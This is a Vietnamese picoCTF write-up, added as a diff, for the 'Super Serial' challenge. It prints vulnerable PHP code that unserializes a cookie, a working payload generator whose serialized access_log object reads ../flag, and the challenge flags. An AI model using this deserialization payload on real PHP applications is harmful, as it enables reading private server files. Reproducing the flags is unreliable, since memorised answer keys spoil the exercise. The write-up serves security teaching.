@@ -1208,3 +1208,167 @@ Decode Base64 chuỗi `cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyf
 ### Flag
 
 `picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}`
+
+## Super Serial
+
+> Try to recover the flag stored on this website
+>
+> <http://mercury.picoctf.net:25395/>
+>
+> **Hints**
+>
+> The flag is at ../flag
+
+Vào URL của thử thách, chúng ta thấy giao diện web cho phép đăng nhập:
+
+![image](images/super-serial/image-1.png)
+
+Khi truy cập vào file `robots.txt`, chúng ta thấy `admin.phps` được chỉ định:
+
+![image](images/super-serial/image-2.png)
+
+Tuy nhiên, khi vào `admin.phps` lại nhận được dòng chữ "Not Found":
+
+![image](images/super-serial/image-3.png)
+
+Vậy, sẽ ra sao nếu chúng ta đổi `admin` thành `index`? Chúng ta có thể đọc được nội dung của file `index.phps`:
+
+![image](images/super-serial/image-4.png)
+
+Từ đoạn code trên, chúng ta thấy server có file `cookie.php`. Nếu đăng nhập thành công là guest hoặc admin, object `$perm_res` sẽ được serialized và mã hoá Base64 rồi gán cho cookie `login`. Sau đó, điều hướng tới `authentication.php`:
+
+```php
+<?php
+require_once("cookie.php");
+
+if (isset($_POST["user"]) && isset($_POST["pass"])) {
+    $con = new SQLite3("../users.db");
+    $username = $_POST["user"];
+    $password = $_POST["pass"];
+    $perm_res = new permissions($username, $password);
+    if ($perm_res->is_guest() || $perm_res->is_admin()) {
+        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
+        header("Location: authentication.php");
+        die();
+    } else {
+        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
+    }
+}
+
+```
+
+Quay lại truy cập vào `authentication.phps` để xem được nội dung file code. Tại đó, có một class `access_log` có khả năng đọc file khi object thuộc class này được sử dụng như string:
+
+![image](images/super-serial/image-5.png)
+
+File `cookie.phps` có nội dung như sau:
+
+```php
+<?php
+session_start();
+
+class permissions {
+    public $username;
+    public $password;
+
+    function __construct($u, $p) {
+        $this->username = $u;
+        $this->password = $p;
+    }
+
+    function __toString() {
+        return $u . $p;
+    }
+
+    function is_guest() {
+        $guest = false;
+
+        $con = new SQLite3("../users.db");
+        $username = $this->username;
+        $password = $this->password;
+        $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+        $stm->bindValue(1, $username, SQLITE3_TEXT);
+        $stm->bindValue(2, $password, SQLITE3_TEXT);
+        $res = $stm->execute();
+        $rest = $res->fetchArray();
+        if ($rest["username"]) {
+            if ($rest["admin"] != 1) {
+                $guest = true;
+            }
+        }
+        return $guest;
+    }
+
+    function is_admin() {
+        $admin = false;
+
+        $con = new SQLite3("../users.db");
+        $username = $this->username;
+        $password = $this->password;
+        $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+        $stm->bindValue(1, $username, SQLITE3_TEXT);
+        $stm->bindValue(2, $password, SQLITE3_TEXT);
+        $res = $stm->execute();
+        $rest = $res->fetchArray();
+        if ($rest["username"]) {
+            if ($rest["admin"] == 1) {
+                $admin = true;
+            }
+        }
+        return $admin;
+    }
+}
+
+if (isset($_COOKIE["login"])) {
+    try {
+        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+        $g = $perm->is_guest();
+        $a = $perm->is_admin();
+    } catch (Error $e) {
+        die("Deserialization error. " . $perm);
+    }
+}
+
+```
+
+Chúng ta thấy tại đoạn code dưới tồn tại lỗ hổng PHP Deserialization. Giá trị của cookie `login` ở dạng Base64 được truyền vào hàm `unserialize()`.
+
+Để ý object `$perm` được truy cập như string ở hàm `die("Deserialization error. " . $perm);` trong trường hợp xảy ra lỗi. Do đó, ý tưởng của chúng ta là chỉ thực hiện serialize object thuộc class `access_log`. Để khi object `$perm` được tạo ra sau quá trình `unserialize()` sẽ không có method `is_guest()`. Từ đó, truy cập vào `$perm->is_guest();` sẽ xảy ra lỗi và nhảy xuống khối `catch`:
+
+```php
+if (isset($_COOKIE["login"])) {
+    try {
+        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+        $g = $perm->is_guest();
+        $a = $perm->is_admin();
+    } catch (Error $e) {
+        die("Deserialization error. " . $perm);
+    }
+}
+```
+
+Vậy, chúng ta sẽ viết đoạn code dưới để tạo payload. Chúng ta đặt giá trị của attribute `$log_file` là `../flag` để khi object này được truy cập như string nó sẽ gọi tới hàm `read_log()` và đọc được file `../flag`:
+
+```php
+<?php
+class access_log {
+    public $log_file;
+
+    function __construct($lf) {
+        $this->log_file = $lf;
+    }
+}
+
+$obj = new access_log("../flag");
+
+echo base64_encode(serialize($obj));
+// TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+Thêm chuỗi vừa tạo vào cookie `login` và gửi request tới `/authentication.php`, chúng ta có thể đọc được flag:
+
+![image](images/super-serial/image-6.png)
+
+### Flag
+
+`picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}`
